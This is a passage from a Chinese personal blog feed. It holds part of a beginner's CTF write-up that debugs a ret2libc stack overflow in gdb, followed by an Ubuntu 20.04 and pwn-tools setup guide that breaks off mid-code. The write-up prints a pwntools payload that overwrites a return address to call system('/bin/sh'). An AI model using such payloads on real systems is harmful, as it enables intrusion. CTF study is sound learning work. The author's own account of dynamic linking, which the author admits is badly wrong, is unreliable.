src="image-20220415220555539.png" alt="image-20220415220555539"></p><p>5、ok，前面那些都只是一些准备工作，现在开始实战，可以看见，我们的下一跳函数已经变成了plt表，此时的PC指针指向0x08048683（&lt;main+107&gt;位置）</p><p><img src="image-20220415173308662.png" alt="image-20220415173308662"></p><p>6、单步ni</p><p><img src="image-20220415221414664.png" alt="image-20220415221414664"></p><p>7、继续ni，不画栈图了，之后也不再讲这么细了，不然篇幅会很大</p><p><img src="image-20220415222540821.png" alt="image-20220415222540821"></p><p>8、单步ni……，怎么看到了plt表，算了，顺便探索一下plt表和got表</p><p><img src="image-20220415222911934.png" alt="image-20220415222911934"></p><p><img src="image-20220415222936096.png" alt="image-20220415222936096"></p><p><img src="image-20220415222955785.png" alt="image-20220415222955785"></p><p>9、可以看到，我们第一次调用system函数（libc库函数）时，是先跳到了plt表去找函数地址，但此时还未加载进plt表，所以进行了三步：jmp、push、jmp做了下表面工作，走了个过场，就跳到got表（Global Offset Table：全局偏移表）中</p><p><img src="image-20220415223010984.png" alt="image-20220415223010984"></p><p>10、继续ni，这个0x0804a008我不知道是个啥，这里也是我的知识盲区，这是我第一次探索的这么深（虽然还很浅），然后就打开ida看了一下，不是很懂，这里也不做解释了，之后应该还会遇到很多我没见过的东西，看之后是否有幸能得到大佬的解答（大佬应该也不会来看这种带新手入门的文章）</p><p><img src="image-20220415224046953.png" alt="image-20220415224046953"></p><p><img src="image-20220415223956033.png" alt="image-20220415223956033"></p><p>11、继续ni，然后就是endbr32，这条指令没啥用可以直接忽略，感兴趣的可以去百度搜一下</p><p><img src="image-20220415224429865.png" alt="image-20220415224429865"></p><p>12、ni……，先老老实实的把图贴出来吧，暂时也解释不了什么，这里好像是调用什么什么器，忘记名字了</p><p><img src="image-20220415224641604.png" alt="image-20220415224641604"></p><p><img src="image-20220415224728900.png" alt="image-20220415224728900"></p><p><img src="image-20220415224805805.png" alt="image-20220415224805805"></p><p><img src="image-20220415224824799.png" alt="image-20220415224824799"></p><p><img src="image-20220415224847172.png" alt="image-20220415224847172"></p><p><img src="image-20220415224903651.png" alt="image-20220415224903651"></p><p>13、ni，掉了一个call，不清楚这f7f7f7d0是个啥，好像是另一个什么什么器，继续ni……</p><p><img src="image-20220415225105745.png" alt="image-20220415225105745"></p><p><img src="image-20220415225345558.png" alt="image-20220415225345558"></p><p><img src="image-20220415225359926.png" alt="image-20220415225359926"></p><p>暂时到这吧，感觉图片贴的有点多了，有兴趣的自己去调一下看下全过程，之后我就贴点我觉得关键的东西，因为我也不是很懂，所以关不关键我也不知道</p><br/><p>14、三步ni过后，怎么进入system函数了？进了system函数说明plt、got的动态链接过程已经完成了，懵了懵了（怎么这么快，我记得我当初用si单步的时候单了近千次也没见到过程结束，然后当时就直接放弃探索了，有点懵，一会儿用si再来一遍看看），但现在知道了一件事，把之前的啃透，动态链接过程也就能理解一半以上了</p><p><img src="image-20220415225716915.png" alt="image-20220415225716915"></p><p>好了好了，plt、got表部分的探索这里就结束了（开始与第8步，现在位于第14步），现在回到对payload的探索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#exp中的payload</span><br><span class="line"></span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br></pre></td></tr></table></figure><p>15、ok，现在就得关注好ebp、esp的变动了</p><p><img src="image-20220415230832725.png" alt="image-20220415230832725"></p><p>16、可以先看一下我在第4步最后画的那个栈图，这里再画一张。。。刚尝试去画，但发现跟第4步的栈图联系不大，我们先把这system函数度过了再看看，ni……</p><p><img src="image-20220415232001381.png" alt="image-20220415232001381"></p><p>。。。。。。真就来循环</p><p><img src="image-20220415232126396.png" alt="image-20220415232126396"></p><p>跳出来了，应该在250下回车左右，手点了100+下，然后按着不动执行了一小段时间，估算要按250下左右的回车跳出这循环</p><p><img src="image-20220415232240333.png" alt="image-20220415232240333"></p><p>又开始循环了。。。可能之前的si单步近千步没出结果就是卡在这些循环中，而不是卡在前面的plt、got表中，看来plt、got表也不是个很难的东西，只不过是我之前把它想得没那么简单，再进一步去想，或许整个计算机底层实现也并不难，只是我们缺乏好的学习资料罢了</p><p><img src="image-20220415232506909.png" alt="image-20220415232506909"></p><p>17、我去，怎么直接结束了</p><p><img src="image-20220415233253571.png" alt="image-20220415233253571"></p><p>18、赶紧往上翻回去看看，ok，在经历了诸多循环之后，我们的esp移动到了该移动到的位置，并将它指向的栈上的数据存入了ebp</p><p><img src="image-20220415233443490.png" alt="image-20220415233443490"></p><p><img src="image-20220415234122774.png" alt="image-20220415234122774"></p><p>第4步的栈图再贴一次，所以我们应当去找ebp为0xffd1319c的时候，或者去找下图中的一些关键数据（如0xffd13110、0x62626262、0x08048720、0x08048460）</p><p><img src="image-20220415234221219.png" alt="image-20220415234221219"></p><p>19、这是结束之前最后出现的一次ebp、esp，不是我想要的值</p><p><img src="image-20220415234751330.png" alt="image-20220415234751330"></p><p>之后的结束截图留一下，这里提示的并不是程序结束，可能是已经拿到系统shell的原因，所以程序没结束，但也没有指令可以执行，所以就报这样的warning，或者是一些其他的原因，暂时到此为止吧</p><p><img src="image-20220415234853843.png" alt="image-20220415234853843"></p><br/><br/><p><strong>总结：</strong></p><p>遗憾：</p><p>经过一轮实战调试，这里esp是怎样的将0x08048460存入eip，执行完又跳回来将0x08048720存入eip还是没有实际操作出来，只能是依赖我姐之前给我讲的知识勉强解释，但我知道，以后这一块我还是会很懵，所以之后还得再仔细调一遍</p><p><img src="image-20220415235343476.png" alt="image-20220415235343476"></p><p>收获：</p><p>对于前面提到的什么什么器，看了几篇博客，有说动态链接器的也有说解析器的，还有说链接器/加载器的。</p><p>链接：<a href="https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解_77458的博客-CSDN博客_got表</a></p><p>链接：<a href="https://zoepla.github.io/2018/04/%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8Aplt&got/">非常详细地解释plt&amp;got (zoepla.github.io)</a></p><p>链接：<a href="https://www.cnblogs.com/zuoanfengxi/p/12763350.html">调试下的plt&amp;got - zer0_1s - 博客园 (cnblogs.com)</a></p><br/><br/><p><strong>我来简单说说我理解的动态链接过程吧，肯定会有错，但我还是想说一下我的理解</strong></p><br/><h3 id="动态链接过程（延迟绑定）："><a href="#动态链接过程（延迟绑定）：" class="headerlink" title="动态链接过程（延迟绑定）："></a>动态链接过程（延迟绑定）：</h3><p>1、我们的代码中经常会调用到我们没有自己定义的函数，例如printf、scanf</p><p>2、这些函数都存储在我们的 libc 库（动态链接库）中，当然这样存有诸多函数的库有很多，libc只是其中一个，在C语言中调用他们我们只需要一个头文件（例如 #include&lt;stdio.c&gt;）</p><p>3、当我们的程序开始执行时，代码信息及libc库等信息就会被载入内存中，同时被分配好自己的地址（gdb中使用vmmap可查看这些地址信息）</p><p>4、当我们的程序中用到了libc库中的函数时，程序会先跳进__plt表__中寻找是否有该函数的实际地址（第一次是没有的），没有时就会跳进got表，然后__got表__中存了该函数在libc库中的__偏移值__，这时计算机会记录这个偏移值，然后调用前面说的__什么什么器__找到libc库的实际初始地址，接着将got表的偏移值加上libc的初始位置值就得到的该函数在内存中的实际地址，然后再调用__什么什么器__改写plt表，将真实地址写入plt，下次再调用该函数时就能直接跳到该函数的实际地址</p><p>5、ok，结束</p><p>6、的确错得离谱，不改了，留个回忆，照着下面的学习链接学就行了</p><p>7、贴个学习链接：<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">Basic-ROP · 语雀 (yuque.com)</a></p><p>8、配套学习视频：<a href="https://www.bilibili.com/video/BV1a7411p7zK?share_source=copy_web">https://www.bilibili.com/video/BV1a7411p7zK?share_source=copy_web</a></p><p>9、要是能早点找到这学习视频，可以省下很多学习时间</p><br/><br/><br/><br/><h2 id="例2：ret2libc3"><a href="#例2：ret2libc3" class="headerlink" title="例2：ret2libc3"></a>例2：ret2libc3</h2><p>链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3</a></p>]]></content>
    
    
    <summary type="html">失败的栈分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>New start</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/12/New-start/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/12/New-start/</id>
    <published>2022-04-12T15:14:53.000Z</published>
    <updated>2022-04-12T15:27:25.288Z</updated>
    
    <content type="html"><![CDATA[<p>不管过去有多难，你都可以重新开始</p><p><img src="begin_again.jpg" alt="begin_again"></p><br/><p>留下一个小心愿 ……</p><p>D:\&amp;.txt</p>]]></content>
    
    
    <summary type="html">begin_again</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ubuntu20.04安装</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/03/26/ubuntu20-04%E5%AE%89%E8%A3%85/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/03/26/ubuntu20-04%E5%AE%89%E8%A3%85/</id>
    <published>2022-03-26T09:42:17.000Z</published>
    <updated>2022-04-24T01:07:24.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubuntu20-04安装"><a href="#ubuntu20-04安装" class="headerlink" title="ubuntu20.04安装"></a>ubuntu20.04安装</h1><p>参考教程：<a href="https://blog.csdn.net/Thanlon/article/details/100072462">https://blog.csdn.net/Thanlon/article/details/100072462</a></p><p>下载链接（也可以去官网找）：<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/20.04/">Index of /ubuntu-releases/20.04/ | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><br/><p>1、我们选择 ubuntu-20.04.4-desktop-amd64.iso 镜像文件进行下载</p><p><img src="image-20220326175648163.png" alt="image-20220326175648163"></p><p>2、打开VMware，新建虚拟机</p><p><img src="image-20220326185139002.png" alt="image-20220326185139002"></p><p>3、自定义安装，单击下一步</p><p><img src="image-20220326185315371.png" alt="image-20220326185315371"></p><p>4、默认，单击下一步</p><p><img src="image-20220326185432213.png" alt="image-20220326185432213"></p><p>5、稍后安装操作系统，单击下一步</p><p><img src="image-20220326185525514.png" alt="image-20220326185525514"></p><p>6、选择Ubuntu64位，单击下一步</p><p><img src="image-20220326185635539.png" alt="image-20220326185635539"></p><p>7、虚拟机名称可选默认，但我个人推荐写成操作系统+版本号；安装位置可以选默认，但我个人有存储虚拟机操作系统的文件夹，所以进行了修改；单击下一步</p><p><img src="image-20220326185851308.png" alt="image-20220326185851308"></p><p>8、网上找了一些有关Ubuntu虚拟机处理器配置的文章，不是很明白，先默认吧，反正之后应该能改，就算改不了大不了重新装一遍，默认，单击下一步</p><p><img src="image-20220326190909119.png" alt="image-20220326190909119"></p><p>9、内存推荐4GB，单击下一步</p><p><img src="image-20220326191049792.png" alt="image-20220326191049792"></p><p>10、网络地址转换，单击下一步</p><p><img src="image-20220326191136709.png" alt="image-20220326191136709"></p><p>11、默认，单击下一步</p><p><img src="image-20220326191231706.png" alt="image-20220326191231706"></p><p>12、默认，单击下一步</p><p><img src="image-20220326191307807.png" alt="image-20220326191307807"></p><p>13、创建新虚拟磁盘，单击下一步</p><p><img src="image-20220326191409945.png" alt="image-20220326191409945"></p><p>14、分配的大小根据个人情况来，常用且磁盘/硬盘容量足够，可以适当多分配一点；存储为单个文件；单击下一步</p><p><img src="image-20220326191749299.png" alt="image-20220326191749299"></p><p>15、默认，单击下一步</p><p><img src="image-20220326191841352.png" alt="image-20220326191841352"></p><p>16、默认，单击完成</p><p><img src="image-20220326191943163.png" alt="image-20220326191943163"></p><p>17、编辑虚拟机设置-&gt;CD/DVD(SATA)-&gt;使用ISO映像文件-&gt;装载第一步下载的 .iso 文件，单击确定（在下方，下图中没截出来）</p><p><img src="image-20220326192331571.png" alt="image-20220326192331571"></p><p>18、开启此虚拟机</p><p><img src="image-20220326192638151.png" alt="image-20220326192638151"></p><p>19、等待</p><p><img src="image-20220326192835116.png" alt="image-20220326192835116"></p><p>20、选择语言（中文简体），单击安装Ubuntu</p><p><img src="image-20220326192957630.png" alt="image-20220326192957630"></p><p>21、好家伙，看不到下面的继续按钮</p><p><img src="image-20220326193419053.png" alt="image-20220326193419053"></p><p>21-1：尝试挪动，无果，单击输入框</p><p><img src="image-20220326193606306.png" alt="image-20220326193606306"></p><p>21-2：查看别人的教程，得知继续按钮的位置</p><p><img src="image-20220326193718956.png" alt="image-20220326193718956"></p><p>21-3：返回21-1中键盘按下 ↓ ↓ → → ，不放心的话可以多按几个 ↓ →，然后回车，成了（对了，之后有些界面用不了 ↓ 的话，可以试试 TAB 键），但下一个界面又看不到下面的继续按钮，之后我直接贴别人的图了，方便看，我这我就自己用键盘解决（注：若勾选下图中安装Ubuntu时下载更新，安装过程会特别慢，对了，这里的更新只是更新一些程序，不会使Ubuntu的版本发生改变，觉得慢的话可以点skip跳过）</p><p><img src="image-20220326193904939.png" alt="image-20220326193904939"></p><p>22、默认，单击继续</p><p><img src="image-20220326194129604.png" alt="image-20220326194129604"></p><p>23、不知道为什么，我这突然又好了，这里清除的是你分配的磁盘空间，不是将你的磁盘清空，默认，单击现在安装</p><p><img src="image-20220326194314203.png" alt="image-20220326194314203"></p><p>24、单击继续</p><p><img src="image-20220326194718691.png" alt="image-20220326194718691"></p><p>25、选至中国，单击继续</p><p><img src="image-20220326194913295.png" alt="image-20220326194913295"></p><p>26、密码设简单一点吧，方便以后操作，姓名显示如步骤30（目前步骤26，下图中的姓名我在点继续之前改成了xy6666，以便观察）,用户名显示如图26-1，单击继续</p><p><img src="image-20220326195130546.png" alt="image-20220326195130546"></p><p>26-1：</p><p><img src="image-20220326195221393.png" alt="image-20220326195221393"></p><p>27、等待，有点难等 U•ェ•*U</p><p><img src="image-20220326195600723.png" alt="image-20220326195600723"></p><p>28、单击现在重启</p><p><img src="image-20220326202731717.png" alt="image-20220326202731717"></p><p>29、单击回车，图没截到 QAQ</p><br/><p>30、点击xy6666</p><p><img src="image-20220326202942419.png" alt="image-20220326202942419"></p><p>31、菜单栏找到终端右键添加至收藏夹，双击打开一个终端，ok了</p><p><img src="image-20220326203451297.png" alt="image-20220326203451297"></p><br/><br/><br/><h1 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h1><p>参考链接：<a href="https://blog.csdn.net/dmedaa/article/details/107992159">Ubuntu设置修改root密码（初始密码）_k3rw1n的博客-CSDN博客_ubuntu设置root密码</a></p><p>在终端输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root </span><br><span class="line"></span><br><span class="line">注：Ubuntu中的复制粘贴是 ctrl+<span class="built_in">shift</span>+c/v</span><br></pre></td></tr></table></figure><p> 会显示以下内容，根据内容输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[sudo] password <span class="keyword">for</span> kerwin: <span class="comment">#输入当前用户密码</span></span><br><span class="line">New password:               <span class="comment">#输入root新密码</span></span><br><span class="line">Retype new password:        <span class="comment">#再次输入root密码</span></span><br><span class="line">passwd: password updated successfully   <span class="comment">#密码更新成功</span></span><br></pre></td></tr></table></figure><br/><br/><br/><h1 id="终端颜色风格设置"><a href="#终端颜色风格设置" class="headerlink" title="终端颜色风格设置"></a>终端颜色风格设置</h1><p>1、打开终端，感觉这暗绿色的前缀不太好看（个人对老版本的亮绿色前缀看习惯了），所以决定修改一下</p><p><img src="image-20220327103040268.png" alt="image-20220327103040268"></p><p>2、点击终端右上角的菜单，打开配置文件首选项</p><p><img src="image-20220327103239300.png" alt="image-20220327103239300"></p><p>3、点击配置文件后面的+号，新建一个配置文件（别直接在默认上的改，若新建的改崩了，还可以调回默认的配置文件），将新建的配置文件设为默认。</p><p><img src="image-20220327103414801.png" alt="image-20220327103414801"></p><p><img src="image-20220327103443140.png" alt="image-20220327103443140"></p><p>4、光标形状默认是方块，我修改成了下划线，个人感觉方便观看一些</p><p><img src="image-20220327103620607.png" alt="image-20220327103620607"></p><p>5、ok，终端风格自己看着配吧</p><p><img src="image-20220327104054581.png" alt="image-20220327104054581"></p><p>6、新旧终端对比图</p><p><img src="image-20220327104243651.png" alt="image-20220327104243651"></p><br/><br/><br/><h1 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h1><p>##—–这里是后后来加的—–##</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天（2022/4/22，也就是文中的后后来），我在帮舍友安装Ubuntu20.04时出现了无法复制文件进入Ubuntu的尴尬局面，在我们的一番尝试下问题并没有得到解决，所以暂时没有好的解决方案，QAQ</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有需要的小伙伴请自行百度探索解决方案，加油 ^_^</p><br/><br/><br/><h1 id="切换apt源"><a href="#切换apt源" class="headerlink" title="切换apt源"></a>切换apt源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##-----这里是后后来加的-----##</span></span><br><span class="line"><span class="comment">#注：如果你的虚拟机无法从外界复制文字、文件进来，而且暂时无法解决又想先换apt源的话</span></span><br><span class="line"><span class="comment">#请用Ubuntu20.04自带的火狐浏览器打开我的这篇博客，这样你就能在虚拟机内完成复制的操作了</span></span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/142014944?utm_source=wechat_session&utm_medium=social&utm_oi=77684843479040">Ubuntu20.04软件源更换 - 知乎 (zhihu.com)</a></p><p>链接：<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/?utm_source=wechat_session&utm_medium=social&utm_oi=77684843479040">ubuntu | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><p>1、Ubuntu安装完毕，现在准备为我的Ubuntu搭建一个pwn学习环境，但发现连个git都安装不了</p><p><img src="image-20220327104545469.png" alt="image-20220327104545469"></p><p>2、原因呢，可能是因为墙的原因（也有可能是因为我目前虚拟机的网络配置有问题），所以下不了国外网站的东西，先不管了，切换个apt源再说</p><p>3、大致分三个步骤：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1）：备份文件（/etc/apt/sources.list）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2）：打开文件（/etc/apt/sources.list）并删除文件中的所有内容（/etc/apt/sources.list）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3）：粘贴相应字段至文件（/etc/apt/sources.list）即可</p><p>4、下面我们来操作，1）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入指令：sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><p><img src="image-20220327110946203.png" alt="image-20220327110946203"></p><p>可以看到，已经生成了备份的.bak文件</p><p>5、（新的方法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list </span><br><span class="line"><span class="comment">#直接以文本的方法打开sources.list，然后再把步骤3）:的apt源复制进去就行（复制前要把原apt源全部删除），这样就不用使用vi了</span></span><br></pre></td></tr></table></figure><p>现在执行2）：因为之前用的都是vim，但现在没翻墙vim下不了，vi捣鼓了半天不太会用，这里我选择直接  #rm sources.list   ，然后再 vi 新建一个同名文件</p><p><img src="image-20220327111845353.png" alt="image-20220327111845353"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上图末尾处输入：</span><br><span class="line"><span class="comment"># vi sources.list</span></span><br></pre></td></tr></table></figure><p>5-1：进入vi编辑器后，先按两下i，有如下显示后按DELETE键删除掉这个i（平时用来删除文字的BACKSPACE反正我用不了）</p><p><img src="image-20220327112352100.png" alt="image-20220327112352100"></p><p>6、现在来操作3）：，确保i删除文本中没有任何内容后，复制以下文字到文本中（注：Ubuntu中的复制粘贴是 ctrl+shift+c/v）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预发布软件源，不建议启用</span></span><br><span class="line"><span class="comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p><img src="image-20220327112917132.png" alt="image-20220327112917132"></p><p>6-1：按下冒号键（shift+：），输入wq，回车</p><p><img src="image-20220327113227681.png" alt="image-20220327113227681"></p><p>6-2：# cat sources.list 查看内容是否修改成功，显示如下则表示修改成功</p><p><img src="image-20220327113439696.png" alt="image-20220327113439696"></p><br/><p><strong>注：ok，换源操作到此为止，下面是我换源后遇到的一些问题，记录一下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##-----这里是后后来加的-----##</span></span><br><span class="line"><span class="comment">#换完源后</span></span><br><span class="line">$ sudo atp-get update</span><br><span class="line">$ sudo apt install vim</span><br><span class="line"><span class="comment">#就装好了vim</span></span><br><span class="line"><span class="comment">#装好vim后，你就会发现vi没那么难用了，操作跟vim一模一样，不知道为什么，挺玄学的</span></span><br></pre></td></tr></table></figure><p>（括号内这段是我后来加的：这些问题在我重启了虚拟机之后得到了解决，也就是说，换完源后可以先重启一下）</p><br/><p>7、不知道什么情况，准备打exit退出root模式的，结果弹出这些东西，记录一下：（可能是我在root模式时使用了apt install vim导致的）（输入：ctrl+D）</p><p><img src="image-20220327113944751.png" alt="image-20220327113944751"></p><p>8、既然它提示了个 vim:finished 下好了那我们试试，行吧，我想多了</p><p><img src="image-20220327114155032.png" alt="image-20220327114155032"></p><p>9、输入指令 $ sudo apt install vim  ， emm……什么鬼</p><p><img src="image-20220327114411243.png" alt="image-20220327114411243"></p><p>10、更新一下 apt-get ，.。。。。。。</p><p><img src="image-20220327115637840.png" alt="image-20220327115637840"></p><p>11、ping 一下本地，能通</p><p><img src="image-20220327115709460.png" alt="image-20220327115709460"></p><p>12、ping下百度</p><p><img src="image-20220327120048098.png" alt="image-20220327120048098"></p><p>12-1：Windows  cmd中 ping 下百度，记录ip</p><p><img src="image-20220327120158320.png" alt="image-20220327120158320"></p><p>12-2：ping不通，看来我这还得调下网络配置</p><p><img src="image-20220327120222752.png" alt="image-20220327120222752"></p><p>12-3：查找解决方案</p><p>参考链接：<a href="https://blog.csdn.net/aaaaajiboke/article/details/86595305"> Linux解决ip ping不通百度的问题_aaaaajiboke的博客-CSDN博客_linux ping不通</a></p><p>13、。。。。。。还要改配置文件，我先试试重启虚拟机吧。。。。。。重启过后，先来ping下百度，⊙∀⊙！，通了，那上面的解决方案目前就用不到了，行吧，这就这么过了，以后遇到网络问题就重启试试。</p><p><img src="image-20220327125630382.png" alt="image-20220327125630382"></p><p>13-1：vim装不了，试试先更新下apt</p><p><img src="image-20220327125718524.png" alt="image-20220327125718524"></p><p><img src="image-20220327125836746.png" alt="image-20220327125836746"></p><p>13-2：再试试安装vim，成了</p><p><img src="image-20220327125924417.png" alt="image-20220327125924417"></p><p>13-3：输入不了中文，进入火狐浏览器–&gt;地址栏输入<a href="http://www.baidu.com--&gt;搜索搜狗输入法/">www.baidu.com--&gt;搜索搜狗输入法</a></p><p><img src="image-20220327130210174.png" alt="image-20220327130210174"></p><p>13-4：点击输入法linux版，下载x86的就行，下载后有个教程，跟着做就行，注销计算机就是重启</p><p><img src="image-20220327130457022.png" alt="image-20220327130457022"></p><br/><br/><br/><h1 id="Pwntools安装"><a href="#Pwntools安装" class="headerlink" title="Pwntools安装"></a>Pwntools安装</h1><p>参考链接：<a href="https://blingblingxuanxuan.github.io/2020/02/23/paper/#5-%E6%96%B0%E6%9C%BA%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83">ctf堆入门 - paper | Clang鱼塘 (blingblingxuanxuan.github.io)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装Pwntools</span></span><br><span class="line"></span><br><span class="line">$ apt-get update</span><br><span class="line"></span><br><span class="line">$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line"></span><br><span class="line">$ python3 -m pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">$ python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试：能导入pwn模块并使用cylic表示pwntools安装成功（注：上面的警报不用管）</p><p><img src="image-20220327143156888.png" alt="image-20220327143156888"></p><br/><br/><br/><h1 id="Pwngdb-Pwndbg-的联合使用"><a href="#Pwngdb-Pwndbg-的联合使用" class="headerlink" title="Pwngdb + Pwndbg 的联合使用"></a>Pwngdb + Pwndbg 的联合使用</h1><p>参考链接：<a href="https://lantern.cool/note-tool-pwndbg-pwngdb/">Pwngdb + Pwndbg 的联合使用 | Lantern’s 小站</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pwndbg源码下载</span></span><br><span class="line">~目录下以普通用户输入指令(注：切忌使用root用户进行下载)</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br></pre></td></tr></table></figure><p><img src="image-20220327154050673.png" alt="image-20220327154050673"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pwndbg文件下载好后，终端执行以下两条指令进行安装</span></span><br><span class="line">$ <span class="built_in">cd</span> pwndbg</span><br><span class="line">$./setup.sh</span><br></pre></td></tr></table></figure><p><img src="image-20220327163551136.png" alt="image-20220327163551136"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Pwngdb源码下载</span></span><br><span class="line">~目录下以普通用户输入指令(注：下载东西时别用root用户)</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git</span><br></pre></td></tr></table></figure><p><img src="image-20220327154905108.png" alt="image-20220327154905108"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将.gdbinit复制到~目录下</span></span><br><span class="line"></span><br><span class="line">$ cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line"></span><br><span class="line">或在~目录下执行如下指令：</span><br><span class="line"></span><br><span class="line">$ cp ./Pwngdb/.gdbinit ./</span><br></pre></td></tr></table></figure><p><img src="image-20220327155314298.png" alt="image-20220327155314298"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 